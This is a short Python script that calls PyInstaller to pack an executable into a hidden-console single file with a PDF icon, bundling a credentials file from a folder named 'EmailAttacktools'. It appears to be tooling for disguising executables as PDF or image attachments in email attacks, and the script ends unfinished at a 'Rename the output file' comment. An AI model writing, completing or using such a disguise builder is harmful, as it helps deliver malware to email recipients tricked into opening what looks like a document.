import subprocess

def convert_exe_to_format(exe_file, output_format, data_file, target_dir='.'):
    # if output_format not in ['pdf', 'img']:
    #     raise ValueError("Invalid format. Choose 'pdf' or 'img'.")

    # Specify the file to add and the target directory
    # data_file = 'path/to/your/datafile.txt'
    # target_dir = '.'
    # if output_format not in ['pdf', 'img']:
    #     raise ValueError("Invalid format. Choose 'pdf' or 'img'.")

    # Specify the file to add and the target directory
    target_dir = '.'

    # Specify the credentials file to add
    credentials_file = 'd:\\EmailAttacktools\\credentials.txt'

    # Specify the icon file
    icon_file = 'd:\\EmailAttacktools\\pdf.ico'

    # Construct the pyinstaller command with --add-data for both data_file and credentials_file, and --icon
    command = [
        'pyinstaller',
        '--noconsole',
        '--onefile',
        f'--add-data={data_file};{target_dir}',
        f'--add-data={credentials_file};{target_dir}',
        f'--icon={icon_file}',
        exe_file
    ]

    # Execute the command
    subprocess.run(command, shell=True)
    # Rename the output file


